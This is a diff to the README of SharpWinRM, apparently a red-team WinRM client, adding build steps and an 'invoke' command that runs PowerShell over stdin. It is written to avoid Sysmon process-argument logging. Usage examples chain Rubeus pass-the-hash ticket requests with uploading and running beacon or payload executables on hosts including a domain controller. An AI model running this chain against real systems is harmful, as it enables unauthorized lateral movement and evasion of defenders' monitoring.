@@ -6,12 +6,53 @@ A .NET 4.8 WinRM client for authorized penetration testing. Supports command exe
 
 ## Table of Contents
 
+- [Building](#building)
 - [How It Works](#how-it-works)
 - [Authentication Modes](#authentication-modes)
 - [Pass-the-Hash with Rubeus](#pass-the-hash-with-rubeus)
 - [Commands](#commands)
 - [Opsec Notes](#opsec-notes)
 - [Usage Examples](#usage-examples)
+
+---
+
+## Building
+
+### Prerequisites
+
+- [.NET SDK](https://dotnet.microsoft.com/download) (any recent version — 6, 7, 8)
+- **.NET Framework 4.8 targeting pack** — required because the project targets `net48`
+  - Already present on any Windows machine with .NET 4.8 installed
+  - On a fresh build machine: install via Visual Studio Installer → Individual Components → ".NET Framework 4.8 targeting pack", or download directly from Microsoft
+
+No third-party NuGet packages are used. All references (`Microsoft.CSharp`, `System.Net.Http`) are .NET Framework assemblies already on the machine.
+
+### CLI (dotnet)
+
+```
+cd SharpWinRM
+dotnet build -c Release
+```
+
+`dotnet build` automatically runs `dotnet restore` first, which contacts NuGet to pull down the SDK build tooling (not external packages — the project has none). If you're building on an air-gapped machine, run `dotnet restore` once with internet access first; subsequent builds will use the local cache.
+
+Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`
+
+### Visual Studio
+
+1. Open `SharpWinRM.sln`
+2. Set configuration to **Release** (dropdown at the top)
+3. **Build → Build Solution** (or `Ctrl+Shift+B`)
+
+Output: `SharpWinRM\bin\Release\net48\SharpWinRM.exe`
+
+### Single-file publish (optional)
+
+```
+dotnet publish -c Release -r win-x64 --self-contained false
+```
+
+This produces the same `SharpWinRM.exe` in `bin\Release\net48\win-x64\publish\`. For `execute-assembly` use, the standard `dotnet build` output is sufficient.
 
 ---
 
@@ -188,6 +229,38 @@ SharpWinRM.exe exec ... /command:net user administrator
 
 ---
 
+### `invoke` — PowerShell Execution via stdin
+
+```
+SharpWinRM.exe invoke /target:HOST <auth> /command:PS_COMMAND
+```
+
+Executes a PowerShell command on the remote host by piping it through the WinRM stdin channel — the same delivery mechanism used by `upload`. The command never appears in any process argument list.
+
+```
+SharpWinRM.exe invoke ... /command:Get-LocalUser
+SharpWinRM.exe invoke ... /command:Get-Process | Select Name,Id
+```
+
+**Remote process chain:** `svchost → powershell.exe -NoProfile -NonInteractive -`
+
+**How it differs from `exec`:**
+
+| | `exec` | `invoke` |
+|---|---|---|
+| Remote process | `cmd.exe /c <command>` | `powershell.exe -NoProfile -NonInteractive -` |
+| Command in process args | **Yes** — Sysmon Event ID 1 | **No** — travels through WinRM stdin |
+| PowerShell Script Block Logging | N/A | Captured if enabled (Event ID 4104) |
+| AMSI inspection | No | Yes — at runtime |
+| Accepts PowerShell syntax | No | Yes |
+
+**What EDR sees on the remote host:**
+- Process creation: `powershell.exe -NoProfile -NonInteractive -`
+- Command line contains **no command data** — data travels through the WinRM stdin channel
+- If PowerShell Script Block Logging is enabled, the command will be captured in Event ID 4104
+
+---
+
 ### `upload` — File Upload
 
 ```
@@ -246,6 +319,7 @@ Runs `cmd.exe /c type "remote_path"` — no PowerShell spawned. Raw bytes flow t
 | Operation | Remote process | Data in command line |
 |---|---|---|
 | `exec` | `cmd.exe /c <command>` | Yes — the command |
+| `invoke` | `powershell.exe -NoProfile -NonInteractive -` | No — command via stdin |
 | `upload` | `powershell.exe -NoProfile -NonInteractive -` | No — data via stdin |
 | `download` | `cmd.exe /c type "path"` | No — path only |
 
@@ -286,8 +360,12 @@ SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ticket:jdoe.kirbi /command:wh
 # Upload payload (PowerShell via stdin — no data in command line)
 SharpWinRM.exe upload /target:srv01 /user:CORP\jdoe /ptt /local:beacon.exe /remote:C:\Windows\Temp
 
-# Execute uploaded payload
+# Execute uploaded payload (exec — process args visible but it's just a path)
 SharpWinRM.exe exec /target:srv01 /user:CORP\jdoe /ptt /command:C:\Windows\Temp\beacon.exe
+
+# Invoke PowerShell command via stdin (command NOT in process args — no Sysmon EID 1 logging)
+SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:Get-LocalUser
+SharpWinRM.exe invoke /target:srv01 /user:CORP\jdoe /ptt /command:whoami /groups
 
 # Download output file (cmd.exe type — no PowerShell)
 SharpWinRM.exe download /target:srv01 /user:CORP\jdoe /ptt /remote:C:\Windows\Temp\output.txt /local:output.txt
@@ -296,7 +374,7 @@ SharpWinRM.exe download /target:srv01 /user:CORP\jdoe /ptt /remote:C:\Windows\Te
 Rubeus.exe asktgt /user:svc_admin /rc4:A87F3A337D73085C45F9416BE5787D86 /domain:CORP /outfile:svc.kirbi
 SharpWinRM.exe scan    /target:dc01.corp.local
 SharpWinRM.exe upload  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /local:payload.exe /remote:C:\Windows\Temp
-SharpWinRM.exe exec    /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:C:\Windows\Temp\payload.exe
+SharpWinRM.exe invoke  /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /command:Start-Process C:\Windows\Temp\payload.exe
 SharpWinRM.exe download /target:dc01.corp.local /user:CORP\svc_admin /ticket:svc.kirbi /ssl /remote:C:\Windows\Temp\out.txt /local:out.txt
 ```
 
@@ -309,7 +387,8 @@ SharpWinRM.exe <command> [options]
 
 COMMANDS
   scan      /target:HOST
-  exec      /target:HOST <auth> /command:CMD
+  exec      /target:HOST <auth> /command:CMD          (cmd.exe — command visible in process args)
+  invoke    /target:HOST <auth> /command:PS_COMMAND   (PowerShell stdin — command NOT in process args)
   upload    /target:HOST <auth> /local:PATH /remote:PATH
   download  /target:HOST <auth> /remote:PATH /local:PATH
 
